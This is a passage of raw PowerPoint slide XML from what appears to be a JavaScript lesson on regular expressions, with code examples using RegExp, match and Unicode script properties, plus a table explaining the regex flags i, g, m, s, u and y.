              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// ["1", "2", "3", "100"]</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>searchTerm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prompt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>What</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> for?"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>searchRe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RegExp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">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searchTerm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>gi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"C, Java, JavaScript, Python"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>match</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>searchRe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console.log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16606325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05C3357-C589-46CB-B6E2-1B9C03199E41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274638"/>
            <a:ext cx="10972800" cy="741914"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Expression Flags</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36B5906E-0272-46A4-8EA8-0D1FC51B17EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4114152818"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="608874" y="1268760"/>
          <a:ext cx="10972800" cy="2595880"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1165919">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1039971001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9806881">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3255616283"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Flag</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Explanation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1515630138"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>i</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Case insensitive</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="253129576"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>g</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Global, look for all matches, otherwise just the first match</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4106789937"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>m</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Multiline mode (affects only ^ $), with m those will match line breaks as well</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4045413726"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>s</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Dot all mode, . will also match newline \n</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2308789761"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>u</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Enable full Unicode support</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1507751064"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>y</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Enable sticky mode</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>search at exact position</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>good for efficiency of long strings</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2625573535"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EED77607-FC4C-4733-8C70-FF5CECB83123}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="608874" y="4005064"/>
            <a:ext cx="10972800" cy="2376264"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</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"Some </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Chinese</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>你们好 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>我是老师</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="zh-CN" sz="2000" b="0" dirty="0">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match</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
